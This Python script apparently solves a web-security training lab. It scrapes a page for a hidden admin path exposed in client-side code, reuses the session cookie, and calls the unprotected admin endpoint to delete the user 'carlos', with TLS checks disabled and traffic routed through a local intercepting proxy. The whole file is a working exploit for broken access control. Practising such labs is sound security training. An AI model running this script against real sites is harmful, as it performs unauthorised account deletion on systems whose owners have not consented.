import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def deleteUsr(url):
    ## check for session cookie
    req = requests.get(url , verify=False,proxies=proxies)
    session_cookies = req.cookies.get_dict().get("session")
    ## get the admin endpoint
    soup = BeautifulSoup(req.text, 'lxml')
    admin_instances = soup.find(string=re.compile("/admin"))
    admin_path = re.search("'href', '(.*)'", admin_instances).group(1)
    ## now had admin path 
    if req.status_code == 200:
        print("(+) Admin Panel is Working on %s" % admin_path)
        print("(+) Deleting Carlos User")
        cookies = {'session': session_cookies}
        carlosUrl = url + admin_path + "/delete?username=carlos"
        req = requests.get(carlosUrl,cookies=cookies, verify=False, proxies = proxies)
        if req.status_code == 200:
            print("(+) Carlos has been deleted")
        else:
            print("(+) Cannot delete carlos user")
    else:
        print("(+) Cannot go for admin directory")
        print("(+) Exiting the script......")        



def main():
    if (len(sys.argv) != 2):
        print ("Usage: %s URL " % sys.argv[0].split("/")[0])
        print ("Example: %s www.example.com" % sys.argv[0].split("/")[0])
        sys.exit(-1)
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    deleteUsr(url)    


if __name__ == '__main__':
    main()
